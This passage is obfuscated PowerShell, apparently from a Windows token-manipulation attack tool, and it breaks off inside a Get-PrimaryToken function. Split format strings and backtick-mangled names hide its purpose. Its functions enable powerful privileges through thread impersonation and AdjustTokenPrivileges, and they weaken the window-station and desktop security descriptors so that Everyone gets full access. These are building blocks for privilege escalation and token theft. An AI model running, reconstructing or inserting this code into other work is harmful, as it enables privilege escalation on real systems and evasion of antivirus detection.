    ${l`oO`KUpprivIlE`GeNA`Mew} =  (&("{0}{1}{2}" -f'vA','Ri','ABLE') ("{0}{1}"-f '3','10wc') -vA  )::("{5}{2}{7}{0}{4}{1}{3}{6}"-f 'ForFunc','ionPoi','etDele','nt','t','G','er','gate').Invoke(${lo`oK`u`pPRiVIle`GE`NAME`w`ADDR}, ${loO`k`Up`pRIVilEg`eNaM`eWde`le`g`ATE})
    


    
    Function Ad`D-sigN`Ed`intAS`uns`iGNed
	{
		Param(
		[Parameter(PoSItIon = 0, mandAtoRy = ${T`RUE})]
		[Int64]
		${v`Al`uE1},
		
		[Parameter(POSItiOn = 1, mANDaTory = ${tR`ue})]
		[Int64]
		${va`lU`E2}
		)
		
		[Byte[]]${v`AlUe1b`y`TeS} =   (  &('Ls')  ("{2}{0}{1}"-f 'b','le:5OGdr','VaRIA') ).valuE::("{2}{1}{0}"-f 'tes','etBy','G').Invoke(${v`Alu`e1})
		[Byte[]]${VaL`uE2`By`TeS} =   $5OGdR::("{2}{0}{1}"-f'etBy','tes','G').Invoke(${v`AluE2})
		[Byte[]]${Fi`NALb`y`Tes} =  (  &('Ls')  ('v'+'ARI'+'able:'+'5oGdr')).ValUe::"Ge`TbyT`es"([UInt64]0)

		if (${vALue`1B`Y`TEs}."C`ount" -eq ${V`ALue2`By`TeS}."CO`UnT")
		{
			${C`ARRYOv`Er} = 0
			for (${I} = 0; ${i} -lt ${vAl`uE1`ByT`Es}."CO`UNT"; ${i}++)
			{
				
				[UInt16]${s`UM} = ${v`AlUe`1byt`Es}[${i}] + ${v`Alue2b`YTEs}[${i}] + ${cARR`Y`O`VEr}

				${Fi`NaLby`TES}[${I}] = ${s`uM} -band 0x00FF
				
				if ((${s`UM} -band 0xFF00) -eq 0x100)
				{
					${c`AR`RY`over} = 1
				}
				else
				{
					${Car`R`yOvEr} = 0
				}
			}
		}
		else
		{
			Throw ("{7}{10}{8}{4}{0}{1}{6}{5}{9}{3}{2}" -f 'r','ays','izes','s',' bytear','of different',' ','C','d',' ','annot ad')
		}
		
		return  (  &("{0}{1}{2}"-f'gEt','-IT','EM')  ("{2}{0}{3}{1}" -f'Iab','ogdR','var','lE:5') ).valuE::("{1}{2}{0}"-f 'nt64','T','oI').Invoke(${FiNal`B`yteS}, 0)
	}


    
    function eN`AbLe-s`eASsi`gNp`R`i`m`A`RYToKEN`Privi`LEGe
    {	
	    [IntPtr]${t`hreAD`hA`NdLe} = ${Ge`T`cuRReNTTHrE`AD}."i`NvOKE"()
	    if (${th`Re`AdHan`dlE} -eq   ( &("{0}{1}" -f 'D','Ir') ('VARIABLe'+':'+'0G4'+'Tv'+'Z')  ).vALUE::"z`Ero")
	    {
		    Throw ("{6}{8}{2}{3}{4}{7}{1}{5}{0}" -f ' to the current thread','l','t ','the h','an','e','Un','d','able to ge')
	    }
		
	    [IntPtr]${TH`RE`AdtO`Ken} =  (  &("{1}{0}"-f'em','iT')  ('vA'+'rIablE'+':'+'0G4T'+'Vz')).VaLUe::"z`erO"
	    [Bool]${res`u`lt} = ${oP`ENtHrEA`DTok`En}."iNvO`KE"(${thre`Ad`HAn`DlE}, ${w`iN32conSTa`N`Ts}."t`O`kE`N_QUERY" -bor ${wIn32c`oNST`AN`Ts}."t`oK`EN_aDJ`U`St`_PRIvil`EG`ES", ${FA`Lse}, [Ref]${thrEAd`T`ok`eN})
        ${e`RrORCO`DE} =   (  &("{3}{2}{1}{0}" -f 'aBle','vArI','et-','g') ("{0}{1}"-f'310','wc')  -VaLueO)::("{2}{1}{4}{0}{3}" -f'2Erro','tLastW','Ge','r','in3').Invoke()

	    if (${ReS`U`Lt} -eq ${F`ALsE})
	    {
		    if (${ERROrC`o`De} -eq ${W`iN`32co`NStAn`TS}."ErROR_`NO_`ToKEn")
		    {
			    ${rE`su`lT} = ${i`MPeRsON`A`TeS`Elf}."Inv`oke"(${w`iN32CONstA`NTS}."Secu`R`ITY_DElE`GAt`i`on")
			    if (${RE`s`uLT} -eq ${FA`l`sE})
			    {
				    Throw (&("{2}{0}{1}" -f'j','ect','New-Ob') ("{2}{7}{6}{3}{0}{5}{1}{4}" -f 'Mod','xcep','Comp','t','tion','el.Win32E','en','on'))
			    }
				
			    ${r`ES`ult} = ${OP`eN`T`hreAd`TOKEn}."Inv`OkE"(${T`hR`eADHaN`D`le}, ${wIN32c`O`N`S`TantS}."token`_Q`uE`RY" -bor ${W`in`3`2`cOnStanTs}."toKeN`_`ADj`Us`T_priVILE`g`ES", ${F`AlSe}, [Ref]${THREa`dTO`keN})
			    if (${r`ES`ult} -eq ${FA`lSe})
			    {
				    Throw (&("{2}{0}{1}" -f 'ec','t','New-Obj') ("{4}{3}{2}{1}{5}{0}" -f 'ption','.Win32Exc','tModel','nen','Compo','e'))
			    }
		    }
		    else
		    {
			    Throw ([ComponentModel.Win32Exception] ${E`R`Ror`cODE})
		    }
	    }

        ${cLOseha`N`d`Le}."I`NVokE"(${Thr`eA`d`HANDle}) | &("{1}{0}" -f 'ut-Null','O')
	
        ${lu`IDS`IZe} =  (  &('gi') ("{2}{3}{0}{1}"-f'Le:','310WC','VAr','iaB') ).ValUe::"si`ZeoF"([Type]${L`Uid})
        ${lU`iDP`TR} =   ( &("{2}{0}{1}"-f'E','M','Get-It')  ("{1}{0}{2}"-f'ABl','vaRi','e:310wC') ).ValUE::("{2}{1}{0}" -f 'cHGlobal','o','All').Invoke(${lU`IdsizE})
        ${LuIdo`B`JE`ct} =   $310wC::"Pt`R`TOsTR`UctUre"(${Lu`ID`ptr}, [Type]${Lu`Id})
         ( &("{1}{0}"-f 'cI','G') ("vARiAbLE"+":31"+"0W"+"C") ).VALUe::("{3}{0}{2}{1}"-f'HGl','al','ob','Free').Invoke(${luI`dP`Tr})

	    ${reS`u`lt} = ${loo`ku`pPRIVIlEG`EV`AL`UE}."INVo`Ke"(${NU`ll}, ("{5}{4}{2}{1}{6}{3}{0}"-f'ge','yTokenPriv','Primar','e','eAssign','S','il'), [Ref] ${LUID`obj`E`CT})

	    if (${rEs`UlT} -eq ${f`ALse})
	    {
		    Throw (&("{1}{0}{2}" -f'-Ob','New','ject') ("{1}{2}{0}{3}{5}{4}"-f 'mpone','C','o','ntModel.','eption','Win32Exc'))
	    }

        [UInt32]${LuiDaN`D`ATTriBuT`eSsiZe} =   $310Wc::"SI`Zeof"([Type]${L`uid_aNd_`A`TTrIbuT`eS})
        ${l`UiDanD`A`TtrI`B`UTespTR} =   (  &("{2}{1}{0}" -f'aBLE','Ari','V') ('3'+'10WC')).VALue::("{0}{1}{2}"-f 'Alloc','HGl','obal').Invoke(${luID`AN`D`A`TTRibUtes`S`IZE})
        ${LUID`A`NDA`TTr`iB`utes} =  (&("{1}{2}{0}" -f'TEM','ChIl','Di')  ("{3}{2}{4}{1}{0}" -f 'wc','10','Le:','vaRIAb','3') ).valuE::"Ptr`To`StR`UCTUre"(${lUi`d`AND`ATTRIB`UTesptr}, [Type]${L`UId_`A`Nd_atTr`ibUTes})
          ( &("{0}{1}{2}"-f'get-','IT','Em')  ("v"+"aRIA"+"blE:310"+"wC")).vALUE::("{1}{3}{0}{2}"-f 'Globa','Fre','l','eH').Invoke(${l`UiDAN`DAtT`RiBU`TEspTr})

        ${luiDaNdA`TT`R`IBut`es}."lU`Id" = ${LuiD`oBJ`Ect}
        ${lUi`DAND`AtTrIB`utEs}."ATT`R`ibutes" = ${Win`32coNS`TanTs}."s`e_pRIVIleGE_EnA`B`L`ED"

        [UInt32]${TOke`NP`RIvSIze} =   $310wc::"S`i`ZEoF"([Type]${TOk`E`N_PR`iv`Ileg`es})
        ${ToKeNP`R`I`Vi`LeGeSPTr} =  ( &("{3}{2}{0}{1}"-f'IAbL','E','AR','gET-V')  ("{1}{0}" -f '10wc','3') ).vALuE::("{3}{1}{0}{2}" -f 'HGloba','c','l','Allo').Invoke(${t`OKENPRI`VSi`zE})
        ${TOkEnPR`I`Vi`Leg`es} =  (&("{0}{1}"-f 'I','TEM')  ("vA"+"RIAb"+"le:31"+"0WC")  ).VALue::"pTRtOStR`UctU`RE"(${to`K`ENp`RIvi`LeGEsPtR}, [Type]${ToK`eN`_pri`ViLE`Ges})
          (  &("{1}{3}{2}{0}"-f'le','Ge','RIaB','t-Va')  ("310"+"Wc") -VALueO  )::("{1}{3}{0}{2}" -f 'eHGl','F','obal','re').Invoke(${T`OKeN`P`RIviL`eG`eSpTR})
	    ${t`oKenpRi`VIleG`Es}."Pr`i`VIL`E`GEcoUNt" = 1
	    ${tokEnPr`iv`i`leg`es}."Pr`iVI`lEGes" = ${L`Uid`A`NDa`TtRiB`uTes}

        ${g`l`Obal:tO`ke`Npriv} = ${ToK`enpRIVI`lEG`Es}

	    ${R`E`SuLT} = ${A`dJuSTToK`e`NPRivILe`geS}."I`NVOkE"(${thR`e`AD`Token}, ${fAL`SE}, [Ref] ${TOKenpr`i`V`Ileg`eS}, ${TOKeNP`RiVSi`ZE},  $0g4tVz::"z`Ero",   (&("{1}{0}" -f 'M','itE')  ("{1}{0}{2}{4}{3}"-f'ArIa','V','bLe:0G4','z','TV')  ).valuE::"ze`RO")
	    if (${RE`sU`lt} -eq ${F`A`Lse})
	    {
            Throw (&("{0}{1}{2}" -f'N','ew-Obj','ect') ("{0}{3}{1}{2}{5}{4}{6}"-f 'C','in3','2Ex','omponentModel.W','e','c','ption'))
	    }

        ${CLosEHA`ND`LE}."IN`VOKe"(${thrE`ADTO`kEN}) | &("{1}{2}{0}"-f 'Null','Ou','t-')
    }


    
    function E`NAbL`e-PrI`VI`LEge
    {
        Param(
            [Parameter()]
            [ValidateSet({"{3}{2}{7}{6}{4}{5}{0}{1}"-f 'Privi','lege','i','SeAss','maryToke','n','Pri','gn'}, {"{1}{3}{0}{2}" -f'vi','SeAudi','lege','tPri'}, {"{3}{1}{0}{2}" -f'rivile','eBackupP','ge','S'}, {"{0}{2}{4}{5}{1}{3}" -f'SeChan','eg','geNotifyPr','e','i','vil'}, {"{2}{6}{4}{1}{0}{7}{5}{3}" -f 'al','teGlob','SeCr','e','a','g','e','Privile'},
                {"{0}{2}{4}{1}{3}" -f'SeCreat','fileP','eP','rivilege','age'}, {"{5}{8}{2}{3}{4}{6}{1}{7}{0}" -f'ege','Privi','r','man','en','SeCr','t','l','eatePe'}, {"{2}{6}{4}{0}{3}{5}{1}"-f 'kPri','e','SeCreateSy','vil','n','eg','mbolicLi'}, {"{3}{1}{4}{2}{0}{5}" -f'leg','e','TokenPrivi','S','Create','e'},
                {"{0}{2}{1}"-f 'SeDebugPri','lege','vi'}, {"{1}{0}{4}{3}{2}"-f'gatio','SeEnableDele','e','Privileg','n'}, {"{5}{0}{1}{3}{6}{4}{2}"-f'mp','e','ge','r','rivile','SeI','sonateP'}, {"{2}{5}{0}{4}{1}{3}" -f 'creaseBa','Prior','S','ityPrivilege','se','eIn'},
                {"{1}{2}{0}{4}{3}{5}" -f'seQ','SeIncre','a','taPrivile','uo','ge'}, {"{5}{0}{4}{2}{1}{3}" -f 'Inc','r','aseWo','kingSetPrivilege','re','Se'}, {"{5}{2}{6}{0}{1}{3}{4}" -f'dD','r','o','iverPr','ivilege','SeL','a'}, {"{4}{1}{0}{3}{2}"-f'MemoryPr','Lock','ge','ivile','Se'}, {"{2}{1}{0}{4}{3}"-f'hineAc','c','SeMa','untPrivilege','co'},
                {"{2}{3}{0}{1}{4}{5}"-f'Volum','ePrivi','SeMa','nage','leg','e'}, {"{5}{0}{4}{7}{1}{8}{6}{3}{2}"-f'eProfile','le','e','essPrivileg','S','S','c','ing','Pro'}, {"{3}{2}{0}{1}" -f 'elPrivil','ege','Relab','Se'}, {"{0}{6}{3}{5}{2}{1}{4}{7}"-f 'SeRe','tdown','u','ote','P','Sh','m','rivilege'}, {"{1}{2}{3}{0}"-f'ePrivilege','SeRest','o','r'},
                {"{0}{1}{4}{3}{2}"-f'SeSe','cur','e','eg','ityPrivil'}, {"{3}{0}{4}{2}{1}"-f 'wnPrivi','e','g','SeShutdo','le'}, {"{0}{2}{1}{3}{4}" -f 'SeS','ncAgent','y','Privil','ege'}, {"{2}{5}{0}{1}{3}{4}"-f'Environment','Pri','Se','vileg','e','System'}, {"{5}{2}{4}{1}{0}{3}{6}" -f 'il','Priv','stemProfi','e','le','SeSy','ge'},
                {"{4}{1}{0}{2}{3}" -f'emti','st','mePriv','ilege','SeSy'}, {"{2}{3}{4}{0}{1}"-f'vileg','e','SeTakeOw','ner','shipPri'}, {"{0}{1}{2}"-f 'S','e','TcbPrivilege'}, {"{3}{0}{1}{2}{4}" -f 'meZon','eP','rivileg','SeTi','e'}, {"{3}{1}{2}{0}{5}{4}" -f'redManAccessPr','e','TrustedC','S','ge','ivile'},
                {"{0}{1}{3}{2}" -f 'SeUndoc','kP','ege','rivil'}, {"{8}{3}{2}{1}{4}{7}{0}{5}{6}"-f 'pu','olici','Uns','e','t','tPr','ivilege','edIn','S'})]
            [String]
            ${pR`ivi`LeGE}
        )

	    [IntPtr]${THRE`A`DH`AndlE} = ${gEtC`UrREn`TT`H`ReAd}."iNVo`ke"()
	    if (${ThrEadH`AND`lE} -eq  (&("{1}{3}{2}{0}" -f 'm','GeT','DiTE','-chiL')  ("{1}{2}{0}{3}"-f 'bLE:0g','VARi','a','4TVz') ).value::"Z`ERO")
	    {
		    Throw ("{5}{3}{0}{1}{2}{6}{4}{7}" -f'et the ','hand','le t','e to g','r','Unabl','o the current th','ead')
	    }
		
	    [IntPtr]${t`h`REaDTok`En} =   (  &("{1}{0}" -f'AbLe','VarI')  ("{0}{1}"-f '0G4t','Vz')).valUE::"ZE`Ro"
	    [Bool]${rES`ULT} = ${o`p`ENTHRE`AdtoKeN}."Inv`oKe"(${thR`eADH`ANdLE}, ${Win`32`cOnsT`ANTS}."tOK`eN_`qUerY" -bor ${wi`N3`2CONS`TantS}."TO`kEN`_aDJuSt`_priVIlEGes", ${faL`se}, [Ref]${tHrEadt`ok`eN})
        ${ERrO`RC`OdE} =  ( &("{0}{1}" -f'I','tEm') ("VArI"+"AbLE"+":"+"310"+"WC")).VaLUe::("{0}{4}{3}{1}{2}" -f 'GetLa','Erro','r','32','stWin').Invoke()

	    if (${rE`suLT} -eq ${F`ALSE})
	    {
		    if (${er`RorCO`De} -eq ${win32`COnSt`ANtS}."ERRo`R`_n`o_tokEn")
		    {
			    ${RE`sult} = ${Im`PeRs`oNATe`sELF}."In`VOKE"(${Wi`N32COnStaN`TS}."SE`C`uRITy_D`elEGA`TiOn")
			    if (${RE`s`ULT} -eq ${fAL`Se})
			    {
				    Throw (&("{1}{0}{2}"-f 'ew-Ob','N','ject') ("{4}{0}{5}{6}{1}{2}{3}" -f'om','l.','Win32Exc','eption','C','ponen','tMode'))
			    }
				
			    ${R`esulT} = ${op`eN`THR`e`AdtokEn}."I`NVoke"(${thRea`DH`AnD`LE}, ${win3`2C`ONS`TanTs}."to`KEn`_Q`UeRy" -bor ${wi`N`32ConS`T`AntS}."T`O`keN_`ADj`usT_Pr`ivilEgEs", ${f`Alse}, [Ref]${tHr`e`AdTokeN})
			    if (${r`Esu`lt} -eq ${fa`l`SE})
			    {
				    Throw (&("{0}{2}{1}"-f'New-','t','Objec') ("{1}{3}{2}{4}{0}" -f 'eption','Compo','in32E','nentModel.W','xc'))
			    }
		    }
		    else
		    {
			    Throw ([ComponentModel.Win32Exception] ${eRr`orco`De})
		    }
	    }

        ${CloSeh`A`Nd`LE}."iN`Vo`Ke"(${t`Hrea`dh`AnDlE}) | &("{0}{2}{1}"-f 'O','-Null','ut')
	
        ${Lu`Id`siZE} =  $310wc::"SIZ`EOf"([Type]${l`Uid})
        ${lU`i`Dptr} =   (  &('gi')  ("{0}{3}{1}{2}{4}"-f 'vA','a','blE:310','ri','wC') ).value::("{2}{1}{0}"-f 'Global','H','Alloc').Invoke(${LuiD`sIZe})
        ${L`UiDo`BJ`ECT} =   (  &("{2}{0}{1}" -f '-v','ArIAbLE','GeT') ("{0}{1}" -f'310W','C')  ).vALUE::"P`TrTo`STr`uCTurE"(${Lu`id`pTr}, [Type]${L`uId})
          (&("{1}{0}{2}"-f'r','vA','iable') ("{1}{0}" -f 'C','310W')  -valUE)::("{1}{3}{0}{2}"-f'lo','Fre','bal','eHG').Invoke(${L`uID`pTr})

	    ${res`ulT} = ${lOoku`pp`R`i`ViLe`GevAlUE}."I`Nv`oKe"(${Nu`Ll}, ${PrIV`i`LEge}, [Ref] ${LUI`d`Obj`eCT})

	    if (${ReS`ult} -eq ${f`AlsE})
	    {
		    Throw (&("{0}{2}{1}"-f'New','ct','-Obje') ("{5}{3}{8}{2}{7}{1}{4}{6}{0}"-f 'on','.W','ntM','o','in32','C','Excepti','odel','mpone'))
	    }

        [UInt32]${LuidANdAT`TR`I`BUt`esSI`ze} =  (&("{1}{0}" -f 'aRiAbLe','V')  ("{0}{1}"-f'31','0Wc')  ).ValuE::"sI`ZeOf"([Type]${l`UID_`An`d_`ATTrIBUtEs})
        ${L`uIdAn`Datt`RIbutE`S`P`TR} =  ( &('Gi')  ("Va"+"R"+"ia"+"ble:3"+"10wC")  ).vALue::("{1}{2}{0}{3}" -f 'ob','Al','locHGl','al').Invoke(${lUi`DaN`da`TT`RibU`T`esSIZE})
        ${lUIDA`Nd`ATt`RiBUT`es} =  (  &("{3}{0}{1}{2}"-f 'ARI','aBL','E','gEt-V') ("310"+"Wc") -vA)::"PTR`TOstr`u`ctUrE"(${LUId`An`d`ATtrIbU`Te`S`ptr}, [Type]${lui`D_aN`d_at`T`R`IBUTeS})
         ( &("{1}{0}"-f 'e','vARiaBL')  ("{0}{1}" -f'310','WC')  ).VaLuE::("{0}{2}{1}" -f'Fre','Global','eH').Invoke(${l`uI`dANDa`TT`RiBU`TeS`ptr})

        ${lUi`D`AN`dA`TTRIButes}."LU`id" = ${l`U`iDobj`Ect}
        ${lUiDa`NdaT`Tri`B`u`Tes}."aTT`RIbu`TeS" = ${wi`N32cO`NS`T`ANts}."sE_PRi`VI`L`e`gE_`en`ABlED"

        [UInt32]${TokEnprI`V`S`i`ze} =  $310wc::"sI`Z`eOf"([Type]${toKeN`_`pR`IVIlEGEs})
        ${tO`keNprivI`LEg`esPtR} =  $310wc::("{0}{1}{3}{2}" -f 'Al','l','HGlobal','oc').Invoke(${t`okEnP`RI`VsiZE})
        ${TOKe`NPRI`VI`LEgEs} =  (&("{0}{1}" -f 'ItE','M')  ("Var"+"I"+"A"+"bLe:31"+"0wC") ).valUE::"pt`RTo`S`TrUc`TuRe"(${Token`p`RIvI`le`gesptR}, [Type]${T`OK`en`_p`R`ivilegeS})
          ( &("{0}{2}{1}{3}"-f 'get-V','riaBL','A','e')  ("310W"+"c") ).vALUe::("{2}{0}{1}"-f'ob','al','FreeHGl').Invoke(${TO`kEnp`RI`VIlEG`eSpTr})
	    ${TOKEnpr`ivI`L`Eges}."PRIVIL`EgE`cOUnT" = 1
	    ${T`OkenprI`V`IlE`GeS}."Pri`Vi`LeGeS" = ${LUidAn`d`AttRi`B`U`Tes}

        ${GLob`AL:TO`KE`N`PrIV} = ${tokENpr`i`VIL`EgEs}

        &("{0}{1}{2}" -f'W','rite-V','erbose') ('A'+'tt'+'emptin'+'g '+'t'+'o '+'e'+'nable'+' '+'pri'+'v'+'ilege'+': '+"$Privilege")
	    ${RE`SULT} = ${AdJ`uS`T`TOk`ENpRiVILEges}."IN`VoKE"(${T`h`REadtoken}, ${FAL`Se}, [Ref] ${T`okENPRIv`i`L`EGES}, ${To`KE`NpRI`VSi`ZE},  ( &("{2}{1}{0}{3}" -f 'e','IT','GEt-cHild','M') ('v'+'AriabLE'+':0G4'+'TV'+'Z')).vAlUE::"zE`Ro",   $0G4tvz::"zE`Ro")
	    if (${rESU`lt} -eq ${Fa`lsE})
	    {
            Throw (&("{1}{2}{0}"-f'ect','New-','Obj') ("{0}{6}{5}{7}{2}{4}{3}{1}"-f'Compone','n','Ex','tio','cep','l','ntMode','.Win32'))
	    }

        ${c`lOs`ehAnDLE}."i`N`VokE"(${tHRe`A`Dto`kEN}) | &("{1}{0}" -f 'ull','Out-N')
        &("{2}{1}{3}{0}" -f'se','-','Write','Verbo') ('En'+'abled '+'privi'+'lege:'+' '+"$Privilege")
    }


    
    function SEt-d`ESktoP`ACls
    {
        &("{3}{4}{2}{1}{0}" -f'ege','il','v','Enable-','Pri') -Privilege ("{3}{0}{1}{2}"-f 'ecurit','yPrivile','ge','SeS')

        
        ${wINdow`st`AT`I`oNstR} =  (&("{1}{0}{2}"-f'a','VArI','Ble') ("{1}{0}"-f'0wC','31')  -vAlUeON  )::("{3}{0}{2}{1}"-f'ngToHGlo','i','balUn','Stri').Invoke(("{1}{0}" -f 'nSta0','Wi'))
        ${h`wi`NsTa} = ${OPenWINdo`w`S`T`At`ionw}."I`Nvoke"(${WINd`ows`TatiOn`STR}, ${fa`LSe}, ${WIN3`2C`onSTaNTS}."A`c`cES`s_`sYSteM`_sECuriTY" -bor ${WIn32`Co`Ns`Ta`NtS}."rE`Ad_CoNtR`OL" -bor ${Wi`N32C`O`NStantS}."w`RI`TE`_DAc")

        if (${HwiN`S`Ta} -eq  ( &("{1}{2}{0}" -f 'Able','Ge','t-VaRi')  ('0g4'+'tVZ')  -val)::"z`ERo")
        {
            Throw (&("{1}{2}{0}{3}" -f '-Ob','N','ew','ject') ("{4}{7}{8}{5}{3}{2}{1}{6}{0}"-f'on','n','i','Model.W','Co','ent','32Excepti','mp','on'))
        }

        &("{2}{6}{1}{3}{5}{4}{0}"-f 'eryone','o','Set-','pACL','owEv','ToAll','Deskt') -hObject ${Hw`IN`sTa}
        ${cLOS`EhANd`LE}."InV`o`kE"(${hWIN`s`Ta}) | &("{0}{1}"-f 'Out-Nul','l')

        
        ${hd`esKT`OP} = ${O`pe`NDeSktO`Pa}."iNVO`Ke"(("{1}{0}"-f'efault','d'), 0, ${F`A`LSe}, ${Win32`CoNS`T`AnTS}."desKt`OP_G`EnEriC_`A`Ll" -bor ${wI`N32con`StANTs}."WRITe`_`dAc")
        if (${Hde`S`KToP} -eq   (  &("{1}{0}{2}{3}"-f 'et-var','g','iaBl','e')  ("0G"+"4tVz")  -VAlu)::"z`Ero")
        {
            Throw (&("{2}{0}{1}"-f 'Objec','t','New-') ("{5}{4}{3}{1}{0}{2}"-f'ce','l.Win32Ex','ption','onentMode','omp','C'))
        }

        &("{5}{4}{2}{3}{0}{1}{6}" -f'w','Ever','oA','llo','T','Set-DesktopACL','yone') -hObject ${Hd`Es`K`TOP}
        ${CL`OSEhAn`dle}."InV`OKE"(${hD`E`SKToP}) | &("{0}{1}{2}" -f'O','ut-Nul','l')
    }


    function SE`T-de`S`Kt`op`Acl`T`oalLO`WEVErYone
    {
        Param(
            [IntPtr]${Hobj`E`CT}
            )

        [IntPtr]${PpSID`oW`Ner} =   (  &("{0}{2}{1}" -f'GeT-chILd','em','it')  ("vaR"+"IAbLe:0G4tV"+"z")).ValuE::"Z`ERo"
        [IntPtr]${PPSi`dGR`O`uP} =  $0G4tvZ::"z`ERo"
        [IntPtr]${pp`dacl} =   (  &("{2}{1}{0}" -f'bLE','VaRIa','gEt-') ("{1}{0}" -f'Z','0G4tV')  -vaLueoN )::"Z`ero"
        [IntPtr]${p`pSa`cl} =  $0G4Tvz::"ze`RO"
        [IntPtr]${p`psec`uRI`T`YDE`scrip`Tor} =  (  &("{0}{1}" -f'd','Ir') ('va'+'Ri'+'AbL'+'E:0G4'+'tVZ')  ).value::"zE`RO"
        
        ${re`T`VAL} = ${gETs`EC`Ur`IT`YiNFo}."in`VOKe"(${hob`je`ct}, 0x7, ${w`In`32cO`Nst`AnTs}."d`ACl`_seCuR`ItY_`i`NF`ORMa`TION", [Ref]${P`ps`IDowN`er}, [Ref]${Pp`sID`GRo`uP}, [Ref]${P`P`DaCl}, [Ref]${p`PsAcL}, [Ref]${PpS`e`cUritydESCR`IPt`oR})
        if (${RE`TVAL} -ne 0)
        {
            &("{1}{2}{0}"-f 'te-Error','W','ri') ('Una'+'b'+'le '+'to'+' '+'ca'+'ll '+'Ge'+'t'+'Securit'+'y'+'Info. '+'Err'+'o'+'rCode: '+"$retVal")
        }

        if (${PP`DacL} -ne  $0G4tVZ::"Z`erO")
        {
            ${A`Cl`obJ} =   $310Wc::"PTr`T`O`sTRuCT`uRE"(${P`p`DAcL}, [Type]${A`cL})

            
            [UInt32]${re`ALs`IzE} = 2000
            ${PA`Ll`Us`ersSid} =   $310wC::("{1}{0}{2}"-f 'l','A','locHGlobal').Invoke(${REa`lSiZe})
            ${S`uc`ceSs} = ${cr`eAtEWeLl`knOwN`sId}."iNVO`KE"(1,  (  &("{3}{1}{0}{2}" -f'AriabL','t-V','E','Ge')  ("0G"+"4Tvz") ).VaLuE::"z`ero", ${P`A`LLU`seRssid}, [Ref]${r`E`AlSIZE})
            if (-not ${SUcCe`SS})
            {
                Throw (&("{1}{0}{3}{2}" -f'Ob','New-','t','jec') ("{0}{1}{2}{6}{8}{7}{3}{4}{5}"-f'C','ompon','entMo','xc','eptio','n','del','n32E','.Wi'))
            }

            
            ${t`R`UStEESIzE} =   $310wC::"s`IzeoF"([Type]${T`Ru`sTeE})
            ${T`RusTee`ptR} =  (  &("{2}{1}{0}" -f'm','Ite','Get-')  ('variAB'+'Le'+':310wc')  ).ValUE::("{3}{0}{1}{2}" -f 'l','locH','Global','A').Invoke(${T`RusT`e`eSIzE})
            ${Tru`STEEO`BJ} =  (&("{1}{0}" -f't-ITEm','gE') ("{4}{2}{3}{0}{1}" -f 'blE:310','wC','aR','Ia','V')  ).VAluE::"p`Tr`TO`Str`uctUre"(${tRUS`TEep`Tr}, [Type]${trUs`T`eE})
              (&("{0}{1}{2}"-f 'GET-','vArIa','ble') ("3"+"10wC") -vA)::("{1}{3}{2}{0}"-f 'bal','Fr','lo','eeHG').Invoke(${TRU`S`T`eePtR})
            ${tRUstEE`O`BJ}."pmulti`PL`E`TRu`STee" =   ( &('LS')  ("{3}{0}{2}{1}" -f'RIAB','4tVz','Le:0g','VA') ).vAluE::"zE`Ro"
            ${tR`Us`TEeObj}."mul`Ti`PL`eTr`u`StEEopE`Ra`TiON" = 0
            ${T`RUstEe`oBj}."Tr`us`TEE`Form" = ${wIN3`2COn`S`TANts}."trUstee`_`I`S_SId"
            ${T`RUS`T`eEoBJ}."t`RUStE`et`yPe" = ${Win32`c`o`Ns`TANts}."Tr`uStee`_`is_wELl_knO`Wn_Gr`OUp"
            ${T`RuST`eEO`BJ}."PtStR`Na`me" = ${p`ALLuse`RsSiD}

            
            ${eXP`lici`TAcc`esssizE} =  (  &("{0}{1}" -f 'G','Ci') ("{1}{3}{2}{0}{4}" -f ':','VARIAb','E','l','310wc') ).valUe::"SIZ`Eof"([Type]${e`Xp`liCIT_aCcE`ss})
            ${Expl`I`CITA`ccesspTR} =   $310wc::("{1}{0}{2}" -f 'll','A','ocHGlobal').Invoke(${ex`PLI`citA`Cc`Esss`IzE})
            ${EX`PlI`c`itAccE`ss} =   ( &("{1}{0}" -f 'i','GC') ("{0}{1}{2}" -f 'vAriABLE',':310','Wc') ).Value::"p`TrTOS`T`RucTU`Re"(${E`Xp`LICIta`cCeSSPtr}, [Type]${ExP`LIcit_ac`ceSs})
             (  &("{2}{1}{0}{3}"-f'Varia','-','Get','BLe') ("{1}{0}"-f'10wC','3') -vAlu  )::("{3}{0}{1}{2}"-f 'eeHG','l','obal','Fr').Invoke(${eXPLI`Ci`TACc`ESsp`TR})
            ${EXP`LI`c`ItACC`ESs}."GRf`ACcEs`SP`eR`m`issIonS" = 0xf03ff
            ${EX`P`LiciTA`CcE`sS}."GR`Fa`cCESSMoDe" = ${w`In3`2`c`onstantS}."grA`NT_AcCe`ss"
            ${eXplIcIt`A`CCe`sS}."g`RFin`hE`RITA`NCe" = ${wiN3`2co`Ns`TA`NTS}."objEct_`I`NhEriT_A`CE"
            ${exp`l`ICItacc`Ess}."tr`uStEE" = ${tR`us`TeE`Obj}

            [IntPtr]${NEW`Da`CL} =  $0G4tVZ::"zE`Ro"

            ${R`eTvAl} = ${sE`TE`NtRIeS`iN`AClW}."IN`VOKE"(1, [Ref]${ExplI`ciT`Acc`ESS}, ${p`PDa`CL}, [Ref]${n`EWDA`Cl})
            if (${reT`V`Al} -ne 0)
            {
                &("{2}{0}{1}" -f 'r','ite-Error','W') ('Error'+' '+'ca'+'lling'+' '+'Se'+'tEntr'+'iesInAclW:'+' '+"$RetVal")
            }

              $310wc::("{0}{2}{1}"-f'Fr','HGlobal','ee').Invoke(${pA`L`LuSer`S`sID})

            if (${n`Ew`DACL} -eq  $0G4tVZ::"Z`eRo")
            {
                throw ("{3}{0}{1}{2}"-f 's ','nu','ll','New DACL i')
            }

            
            ${Re`T`VAl} = ${se`TS`e`cuRItYi`Nfo}."INv`OKE"(${hOb`j`ect}, 0x7, ${Wi`N`32CO`N`sTants}."dA`Cl_SECur`IT`y_in`F`ormaTIoN", ${pP`siDowN`er}, ${Pp`SID`gROuP}, ${nEw`d`AcL}, ${p`PsA`cl})
            if (${RE`T`VaL} -ne 0)
            {
                &("{1}{0}{2}"-f 'rite-Err','W','or') ('S'+'e'+'tSec'+'u'+'rityInfo '+'fai'+'led.'+' '+'Re'+'turn '+'v'+'alue: '+"$RetVal")
            }

            ${L`OCAl`FR`ee}."in`Vo`ke"(${P`psec`ur`iTyDE`ScRip`Tor}) | &("{0}{1}" -f 'Out-Nul','l')
        }
    }


    
    function GE`T-PriMAr`yT`OkEn
    {
        Param(
            [Parameter(positIon=0, MAndATORy=${Tr`ue})]
            [UInt32]
            ${prOc`eSs`iD},

            
            [Parameter()]
            [Switch]
            ${FUl`l`PRivs}
        )

        if (${Fu`Llp`R`Ivs})
        {
